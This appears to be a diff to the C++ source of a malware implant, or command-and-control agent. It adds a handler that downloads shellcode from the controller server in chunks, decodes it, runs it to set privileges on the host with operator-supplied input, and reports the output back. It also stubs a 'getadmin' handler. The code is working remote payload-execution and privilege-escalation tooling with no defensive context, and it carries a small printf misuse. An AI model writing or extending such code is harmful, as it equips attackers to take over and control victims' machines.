@@ -778,8 +778,6 @@ std::string executeShellcode(BYTE* execMem) {
 	return finalResult;
 }
 
-
-
 //---------------------------------------------------------------------
 void handleListPrivs(const std::string &agent_id, const std::string &taskID, const std::string &fileID) {
 	json start;
@@ -843,7 +841,66 @@ void handleListPrivs(const std::string &agent_id, const std::string &taskID, con
 
 //---------------------------------------------------------------------
 void handleSetPriv(const std::string &agent_id, const std::string &taskID, const std::string &taskInput, const std::string &fileID) {
-	(void)taskInput;
+	json start;
+	start["task_id"] = taskID;
+	start["file_id"] = fileID;
+
+	json DownloadStart;
+	DownloadStart["ht"] = 7;
+	DownloadStart["data"] = base64_encode(start.dump());
+
+	std::string startcheck = sendRequest(DownloadStart.dump());
+	PRINTF("[DEBUG] DownloadStart response: %s\n", startcheck.c_str());
+
+	json startRet = json::parse(startcheck);
+	int totalChunks = startRet.at("total");
+	int nextChunkID = startRet.at("next_chunk_id");
+	std::string setpriv = startRet.at("chunk");
+
+	while (nextChunkID != 0) {
+		json downloadChunk;
+		downloadChunk["file_id"] = fileID;
+		downloadChunk["chunk_id"] = nextChunkID;
+
+		json wrapDownloadChunk;
+		wrapDownloadChunk["ht"] = 8;
+		wrapDownloadChunk["data"] = base64_encode(downloadChunk.dump());
+
+		std::string downloadChunkResponse = sendRequest(wrapDownloadChunk.dump());
+		PRINTF("[DEBUG] DownloadChunk response: %s\n", downloadChunkResponse.c_str());
+
+		json chunkJ = json::parse(downloadChunkResponse);
+		std::string newchunk = chunkJ.at("chunk");
+		setpriv.append(newchunk);
+		nextChunkID = chunkJ.at("next_chunk_id");
+	}
+
+	json endDownloadData;
+	endDownloadData["task_id"] = taskID;
+	endDownloadData["agent_id"] = agent_id;
+	endDownloadData["status"] = 4;
+
+	json endDownload;
+	endDownload["ht"] = 9;
+	endDownload["data"] = base64_encode(endDownloadData.dump());
+	size_t shellSize = setpriv.size();
+
+	std::string result;
+	setpriv = base64_decode(setpriv);
+	printf("%s\n", setpriv);
+	std::string privset = taskInput;
+	int ret = load_execute_setpriv(setpriv, privset, result);
+	if (ret == 0 && !result.empty()) {
+		// Base64 encode the result to send to the CLI
+		std::string encodedResult = base64_encode(result);
+		sendTaskResult(agent_id, taskID, 4, encodedResult);
+		PRINTF("[+] Completed task: listprivs\n[+] Result:\n%s\n", result.c_str());
+	}
+	else {
+		sendTaskResult(agent_id, taskID, 5, "");
+		PRINTF("[-] listprivs shellcode executed but returned no valid output.\n");
+	}
+	/*
 	// Download the shellcode
 	json start;
 	start["task_id"] = taskID;
@@ -874,7 +931,11 @@ void handleSetPriv(const std::string &agent_id, const std::string &taskID, const
 		sendTaskResult(agent_id, taskID, 5, "");
 		PRINTF("[-] listprivs shellcode executed but returned no valid output.\n");
 	}
-	
+	*/
+}
+
+void handleGetAdmin(const std::string& agent_id, const std::string& taskID, const std::string& fileID) {
+
 }
 
 void handleSS(const std::string &agent_id, const std::string &taskID, const std::string &fileID)
@@ -1214,6 +1275,7 @@ int MAIN {
 	PRINTF("[+] Attempting to register client...\n");
 	std::string registrationResponse = sendRequest(registrationJson);
 	if (registrationResponse.empty()) {
+
 		PRINTF("[-] Registration failed. Exiting.\n");
 		return 1;
 	}
